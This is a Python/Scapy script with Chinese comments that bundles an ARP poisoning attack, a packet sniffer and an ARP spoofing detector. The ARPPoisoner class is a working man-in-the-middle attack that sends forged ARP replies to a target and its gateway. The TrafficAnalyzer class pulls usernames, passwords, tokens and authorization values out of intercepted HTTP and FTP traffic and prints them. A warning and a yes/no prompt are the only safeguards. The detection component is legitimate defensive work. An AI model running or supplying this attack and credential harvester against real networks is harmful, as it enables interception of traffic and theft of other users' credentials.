#!/usr/bin/env python3
"""
ARP Poisoning Attack, Detection and Traffic Analysis using Scapy
警告：僅供教育和授權測試環境使用
"""

from scapy.all import *
import threading
import time
import re
import sys
import argparse
from collections import defaultdict

class ARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface=None):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.is_poisoning = False
        self.original_target_mac = None
        self.original_gateway_mac = None
        
    def get_mac(self, ip):
        """獲取指定 IP 的 MAC 地址"""
        arp_request = ARP(op=1, pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if answered_list:
            return answered_list[0][1].hwsrc
        return None
    
    def start_attack(self):
        """開始 ARP 毒化攻擊"""
        print(f"[*] 開始 ARP 毒化攻擊")
        print(f"[*] 目標: {self.target_ip}")
        print(f"[*] 閘道: {self.gateway_ip}")
        
        # 獲取原始 MAC 地址用於恢復
        self.original_target_mac = self.get_mac(self.target_ip)
        self.original_gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.original_target_mac or not self.original_gateway_mac:
            print("[!] 無法獲取 MAC 地址，攻擊失敗")
            return False
            
        print(f"[*] 目標 MAC: {self.original_target_mac}")
        print(f"[*] 閘道 MAC: {self.original_gateway_mac}")
        
        self.is_poisoning = True
        self.poison_thread = threading.Thread(target=self._poison_loop)
        self.poison_thread.daemon = True
        self.poison_thread.start()
        
        return True
    
    def _poison_loop(self):
        """ARP 毒化主循環"""
        while self.is_poisoning:
            # 告訴目標我們是閘道
            target_arp = ARP(op=2, pdst=self.target_ip, hwdst=self.original_target_mac,
                           psrc=self.gateway_ip, hwsrc=get_if_hwaddr(self.interface or conf.iface))
            
            # 告訴閘道我們是目標
            gateway_arp = ARP(op=2, pdst=self.gateway_ip, hwdst=self.original_gateway_mac,
                            psrc=self.target_ip, hwsrc=get_if_hwaddr(self.interface or conf.iface))
            
            send(target_arp, verbose=False)
            send(gateway_arp, verbose=False)
            
            time.sleep(2)
    
    def stop_attack(self):
        """停止攻擊並恢復 ARP 表"""
        print("[*] 停止 ARP 毒化攻擊")
        self.is_poisoning = False
        
        if hasattr(self, 'poison_thread'):
            self.poison_thread.join()
        
        self.restore_arp()
    
    def restore_arp(self):
        """恢復正確的 ARP 表項"""
        print("[*] 恢復 ARP 表")
        
        # 發送正確的 ARP 回應來恢復
        for _ in range(5):  # 多次發送確保恢復
            target_restore = ARP(op=2, pdst=self.target_ip, hwdst=self.original_target_mac,
                               psrc=self.gateway_ip, hwsrc=self.original_gateway_mac)
            
            gateway_restore = ARP(op=2, pdst=self.gateway_ip, hwdst=self.original_gateway_mac,
                                psrc=self.target_ip, hwsrc=self.original_target_mac)
            
            send(target_restore, verbose=False)
            send(gateway_restore, verbose=False)
            time.sleep(1)
        
        print("[*] ARP 表已恢復")

class TrafficAnalyzer:
    def __init__(self):
        self.sensitive_patterns = {
            'username': re.compile(r'(?i)(user|username|login|email)[=:\s]+([^\s&\r\n]+)', re.MULTILINE),
            'password': re.compile(r'(?i)(pass|password|pwd)[=:\s]+([^\s&\r\n]+)', re.MULTILINE),
            'secret': re.compile(r'(?i)(secret|key|token)[=:\s]+([^\s&\r\n]+)', re.MULTILINE),
            'auth': re.compile(r'(?i)(auth|authorization)[=:\s]+([^\s&\r\n]+)', re.MULTILINE)
        }
    
    def analyze_packet(self, packet):
        """分析封包中的敏感資訊"""
        if packet.haslayer(Raw):
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            
            # 檢查 HTTP 和 FTP 流量
            if packet.haslayer(TCP):
                src_port = packet[TCP].sport
                dst_port = packet[TCP].dport
                
                # HTTP 流量 (port 80)
                if dst_port == 80 or src_port == 80:
                    self._check_http_traffic(packet, payload)
                
                # FTP 流量 (port 21)
                elif dst_port == 21 or src_port == 21:
                    self._check_ftp_traffic(packet, payload)
                
                # 其他流量的敏感資訊檢查
                self._check_sensitive_data(packet, payload)
    
    def _check_http_traffic(self, packet, payload):
        """檢查 HTTP 流量中的敏感資訊"""
        if 'POST' in payload or 'GET' in payload:
            print(f"\n[HTTP] {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")
            
            # 檢查 POST 資料
            if 'POST' in payload and '\r\n\r\n' in payload:
                post_data = payload.split('\r\n\r\n', 1)[1]
                self._find_credentials(post_data, "HTTP POST")
            
            # 檢查 GET 參數
            if 'GET' in payload and '?' in payload:
                get_line = payload.split('\n')[0]
                if '?' in get_line:
                    query_string = get_line.split('?', 1)[1].split(' ')[0]
                    self._find_credentials(query_string, "HTTP GET")
    
    def _check_ftp_traffic(self, packet, payload):
        """檢查 FTP 流量中的認證資訊"""
        if 'USER ' in payload or 'PASS ' in payload:
            print(f"\n[FTP] {packet[IP].src}:{packet[TCP].sport} -> {packet[IP].dst}:{packet[TCP].dport}")
            
            lines = payload.split('\n')
            for line in lines:
                if line.startswith('USER '):
                    username = line[5:].strip()
                    print(f"  找到 FTP 使用者名稱: {username}")
                elif line.startswith('PASS '):
                    password = line[5:].strip()
                    print(f"  找到 FTP 密碼: {password}")
    
    def _check_sensitive_data(self, packet, payload):
        """檢查其他敏感資料"""
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = pattern.findall(payload)
            if matches:
                print(f"\n[{pattern_name.upper()}] {packet[IP].src} -> {packet[IP].dst}")
                for match in matches:
                    if isinstance(match, tuple):
                        print(f"  找到 {pattern_name}: {match[0]} = {match[1]}")
                    else:
                        print(f"  找到 {pattern_name}: {match}")
    
    def _find_credentials(self, data, protocol):
        """在資料中尋找認證資訊"""
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = pattern.findall(data)
            if matches:
                for match in matches:
                    if isinstance(match, tuple):
                        print(f"  [{protocol}] {pattern_name}: {match[0]} = {match[1]}")
                    else:
                        print(f"  [{protocol}] {pattern_name}: {match}")

class ARPDetector:
    def __init__(self):
        self.arp_table = {}
        self.suspicious_count = defaultdict(int)
    
    def detect_arp_poisoning(self, pcap_file=None, live_capture=False, interface=None):
        """檢測 ARP 毒化攻擊"""
        print("[*] 開始 ARP 毒化檢測")
        
        if pcap_file:
            print(f"[*] 分析 PCAP 檔案: {pcap_file}")
            packets = rdpcap(pcap_file)
            for packet in packets:
                self._analyze_arp_packet(packet)
        
        elif live_capture:
            print(f"[*] 即時監控網路流量 (介面: {interface or 'default'})")
            sniff(filter="arp", prn=self._analyze_arp_packet, iface=interface)
    
    def _analyze_arp_packet(self, packet):
        """分析 ARP 封包"""
        if packet.haslayer(ARP):
            arp = packet[ARP]
            
            # 只處理 ARP 回應
            if arp.op == 2:  # ARP Reply
                ip = arp.psrc
                mac = arp.hwsrc
                
                # 檢查 ARP 表中是否已有此 IP
                if ip in self.arp_table:
                    if self.arp_table[ip] != mac:
                        # MAC 地址改變，可能是 ARP 毒化
                        self.suspicious_count[ip] += 1
                        print(f"\n[!] 疑似 ARP 毒化攻擊!")
                        print(f"    IP: {ip}")
                        print(f"    原始 MAC: {self.arp_table[ip]}")
                        print(f"    新 MAC: {mac}")
                        print(f"    異常次數: {self.suspicious_count[ip]}")
                        
                        # 如果異常次數超過閾值，判定為攻擊
                        if self.suspicious_count[ip] >= 3:
                            print(f"[!!] 確認 ARP 毒化攻擊: {ip}")
                            self._log_attack(ip, self.arp_table[ip], mac)
                
                # 更新 ARP 表
                self.arp_table[ip] = mac
    
    def _log_attack(self, ip, original_mac, new_mac):
        """記錄攻擊資訊"""
        with open("arp_attack_log.txt", "a") as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - ARP Poisoning detected for {ip}: {original_mac} -> {new_mac}\n")

def main():
    parser = argparse.ArgumentParser(description="ARP Poisoning Tool and Detector")
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # ARP 攻擊命令
    attack_parser = subparsers.add_parser('attack', help='Start ARP poisoning attack')
    attack_parser.add_argument('target', help='Target IP address')
    attack_parser.add_argument('gateway', help='Gateway IP address')
    attack_parser.add_argument('-i', '--interface', help='Network interface')
    attack_parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    
    # 流量分析命令
    analyze_parser = subparsers.add_parser('analyze', help='Analyze network traffic for sensitive data')
    analyze_parser.add_argument('-i', '--interface', help='Network interface for live capture')
    analyze_parser.add_argument('-f', '--file', help='PCAP file to analyze')
    
    # ARP 檢測命令
    detect_parser = subparsers.add_parser('detect', help='Detect ARP poisoning attacks')
    detect_parser.add_argument('-f', '--file', help='PCAP file to analyze')
    detect_parser.add_argument('-l', '--live', action='store_true', help='Live detection')
    detect_parser.add_argument('-i', '--interface', help='Network interface')
    
    args = parser.parse_args()
    
    if args.command == 'attack':
        print("警告：此功能僅供授權測試環境使用！")
        confirm = input("確認在授權環境中使用? (yes/no): ")
        if confirm.lower() != 'yes':
            print("操作已取消")
            return
        
        poisoner = ARPPoisoner(args.target, args.gateway, args.interface)
        
        if poisoner.start_attack():
            try:
                print(f"[*] 攻擊將持續 {args.duration} 秒")
                time.sleep(args.duration)
            except KeyboardInterrupt:
                print("\n[*] 收到中斷信號")
            finally:
                poisoner.stop_attack()
    
    elif args.command == 'analyze':
        analyzer = TrafficAnalyzer()
        
        if args.file:
            print(f"[*] 分析 PCAP 檔案: {args.file}")
            packets = rdpcap(args.file)
            for packet in packets:
                analyzer.analyze_packet(packet)
        else:
            print("[*] 開始即時流量分析 (按 Ctrl+C 停止)")
            try:
                sniff(prn=analyzer.analyze_packet, iface=args.interface)
            except KeyboardInterrupt:
                print("\n[*] 停止分析")
    
    elif args.command == 'detect':
        detector = ARPDetector()
        
        if args.file:
            detector.detect_arp_poisoning(pcap_file=args.file)
        elif args.live:
            try:
                detector.detect_arp_poisoning(live_capture=True, interface=args.interface)
            except KeyboardInterrupt:
                print("\n[*] 停止檢測")
        else:
            print("請指定 PCAP 檔案 (-f) 或使用即時檢測 (-l)")
    
    else:
        parser.print_help()

if __name__ == "__main__":
    # 範例使用方式
    if len(sys.argv) == 1:
        print("ARP Poisoning Tool and Detector")
        print("使用範例:")
        print("  python script.py attack 192.168.1.100 192.168.1.1 -d 30")
        print("  python script.py analyze -f traffic.pcap")
        print("  python script.py detect -f arp_traffic.pcap")
        print("  python script.py detect -l -i eth0")
        print("\n使用 -h 查看詳細說明")
    else:
        main()
